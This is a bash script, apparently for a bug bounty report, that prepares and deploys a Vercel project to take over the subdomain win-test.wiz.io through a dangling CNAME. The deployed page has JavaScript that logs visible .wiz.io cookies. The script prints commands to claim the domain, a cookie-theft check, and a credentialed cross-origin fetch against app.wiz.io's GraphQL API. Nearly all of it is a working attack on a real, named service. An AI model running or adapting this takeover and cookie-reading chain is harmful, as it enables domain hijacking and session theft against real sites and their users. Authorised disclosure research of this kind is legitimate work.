#!/usr/bin/env bash
# claim-vercel-poc.sh
# Creates a minimal, clearly-labeled PoC project for Vercel claim of win-test.wiz.io.
# Run ONLY after chain tests confirm a positive chain (or to prove standalone takeover).
#
# What this does:
#   1. Creates a minimal HTML page with researcher attribution
#   2. Initializes a git repo suitable for Vercel deployment
#   3. Prints exact Vercel CLI commands to deploy + add custom domain
#
# Vercel then validates the existing CNAME → serves your content at win-test.wiz.io
set -euo pipefail

RESEARCHER="${RESEARCHER:-YOUR_BUGHUNTERS_HANDLE}"
POC_DIR="/tmp/wiz-takeover-poc"

echo "[*] Creating PoC project at $POC_DIR"
rm -rf "$POC_DIR" && mkdir -p "$POC_DIR"

# Minimal HTML — clearly researcher-attributed, no actual phishing content
cat > "$POC_DIR/index.html" << 'EOF'
<!DOCTYPE html>
<html>
<head><title>Security Research — win-test.wiz.io</title></head>
<body style="font-family:monospace;padding:40px;background:#1a1a1a;color:#0f0">
<h1>&#128274; Subdomain Takeover — Security Research</h1>
<p>This page demonstrates a subdomain takeover vulnerability on
<strong>win-test.wiz.io</strong>.</p>
<p>This deployment is controlled by a security researcher for bug bounty
purposes under the Google Vulnerability Reward Program.</p>
<p>This page collects NO user data. It exists only as proof-of-concept.</p>
<hr>
<p>Reported to: <strong>bughunters.google.com</strong></p>
<p>Reporter: <strong id="r">RESEARCHER</strong></p>
<p>Domain: <strong>win-test.wiz.io</strong></p>
<p>Dangling CNAME: <strong>37e7f43d8158e70f.vercel-dns-013.com</strong></p>
<p>Timestamp: <strong id="ts"></strong></p>
<script>
  document.getElementById('ts').textContent = new Date().toISOString();
  // Cookie visibility test — logs what .wiz.io cookies are visible at this origin
  // (safe read-only test — no exfiltration)
  console.log('[PoC] Cookies visible at win-test.wiz.io:', document.cookie ? document.cookie : 'none');
</script>
</body>
</html>
EOF

# Replace placeholder
sed -i "s/RESEARCHER/$RESEARCHER/g" "$POC_DIR/index.html"

# vercel.json — static site, no serverless
cat > "$POC_DIR/vercel.json" << 'EOF'
{
  "version": 2,
  "builds": [{ "src": "index.html", "use": "@vercel/static" }],
  "routes": [{ "src": "/(.*)", "dest": "/index.html" }]
}
EOF

# Git init
cd "$POC_DIR"
git init -q && git add . && git commit -qm "PoC: win-test.wiz.io subdomain takeover"

echo ""
echo "═══════════════════════════════════════════════"
echo "  PoC project ready at: $POC_DIR"
echo "═══════════════════════════════════════════════"
echo ""
echo "NEXT STEPS — run these commands:"
echo ""
echo "  1. Install Vercel CLI (one-time):"
echo "     npm install -g vercel"
echo ""
echo "  2. Deploy to Vercel:"
echo "     cd $POC_DIR && vercel deploy --prod"
echo "     (When prompted for project name, use: wiz-bugbounty-poc)"
echo ""
echo "  3. Add custom domain (this claims the subdomain):"
echo "     vercel domains add win-test.wiz.io"
echo "     # Vercel validates the existing CNAME → instantly serves your content"
echo ""
echo "  4. Confirm takeover:"
echo "     curl -sk https://win-test.wiz.io/ | grep 'Subdomain Takeover'"
echo "     # Should show your PoC page"
echo ""
echo "  5. Cookie theft test (open in browser, check DevTools → Application → Cookies):"
echo "     echo 'Visit https://app.wiz.io first to get cookies, then visit https://win-test.wiz.io'"
echo "     echo 'Open DevTools → Console → look for [PoC] line showing .wiz.io cookies'"
echo "     echo 'Any cookie with Domain=.wiz.io will appear in the console log'"
echo ""
echo "  6. CORS test from claimed domain:"
echo "     # In browser DevTools console at https://win-test.wiz.io:"
cat << 'JSEOF'
     fetch('https://app.wiz.io/api/graphql', {
       method: 'POST',
       credentials: 'include',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({query: '{__typename}'})
     }).then(r => r.text()).then(t => console.log('[CORS]', t))
       .catch(e => console.log('[CORS BLOCKED]', e.message))
JSEOF
echo ""
echo "  7. After PoC — RELEASE the domain (good practice):"
echo "     vercel domains rm win-test.wiz.io"
echo "     vercel remove wiz-bugbounty-poc"
echo ""
echo "IMPACT UPGRADE LOGIC:"
echo "  cookies visible in step 5  → add cookie theft to F001 → Critical"
echo "  CORS unblocked in step 6   → add cross-origin API access to F001 → High+"
echo "  neither                    → standalone High (8.2) is still valid + billable"
